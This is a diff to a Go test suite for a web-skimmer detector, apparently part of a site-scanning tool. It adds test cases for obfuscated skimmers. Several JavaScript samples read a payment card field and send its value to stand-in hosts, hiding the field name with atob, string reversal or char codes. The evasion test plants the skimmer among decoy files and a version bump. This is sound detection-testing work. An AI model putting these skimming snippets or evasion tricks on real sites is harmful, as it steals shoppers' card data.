@@ -28,6 +28,9 @@ func TestSkimmerSignals(t *testing.T) {
 		"analytics":     {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
 		"atob names":    {`var f=document.querySelector(atob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd"));f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
 		"escaped names": {`var n="\x63\x61\x72\x64\x5f\x6e\x75\x6d\x62\x65\x72";$("#"+n).on("blur",function(){navigator.sendBeacon("https://x.example.net/c",this.value)})`, true},
+		"split atob":    {`var f=document.querySelector('[name="'+atob("cGF5bWVudFtj")+atob("Y19udW1iZXJd")+'"]');f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
+		"reversed":      {`var n="]rebmun_cc[tnemyap".split("").reverse().join("");var f=document.querySelector('[name="'+n+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"char codes":    {`var n=String.fromCharCode(99,99,95,110,117,109,98,101,114);$("#"+n).on("blur",function(){new Image().src="https://x.example.net/c?"+this.value})`, true},
 		"jquery-ish":    {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
@@ -117,6 +120,8 @@ func TestSkimmerEvasions(t *testing.T) {
 	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6';")
 	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){})")
 	tr.file("var/www/blog/wp-content/themes/shop/big.js", "jQuery(function(){})")
+	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.0 */")
+	tr.file("var/www/blog/wp-content/themes/shop/style.css", "/* Theme Name: Shop\nVersion: 2.1 */")
 	c := &Collector{StateDir: t.TempDir()}
 	scan := func() (AppReport, []string) {
 		t.Helper()
@@ -138,9 +143,13 @@ func TestSkimmerEvasions(t *testing.T) {
 	}
 	skimmer := `document.addEventListener("change",function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src="https://img.example.com/i.gif?c="+v.value}});`
 	scan()
+	// The builder plugin is updated, its version with it; the shop theme gets decoys at the same
+	// version, put there with the skimmer.
+	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.1 */")
 	for i := range 60 {
 		tr.file(fmt.Sprintf("var/www/blog/wp-content/notes/%02d.txt", i), "x")
 		tr.file(fmt.Sprintf("var/www/blog/wp-content/plugins/builder/assets/%02d.js", i), skimmer)
+		tr.file(fmt.Sprintf("var/www/blog/wp-content/themes/shop/js/%02d.js", i), "jQuery(function(){})")
 	}
 	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){});\n"+skimmer)
 	tr.file("var/www/blog/wp-content/themes/shop/big.js", `var v=document.querySelector('[name="payment[cc_number]"]');/*`+
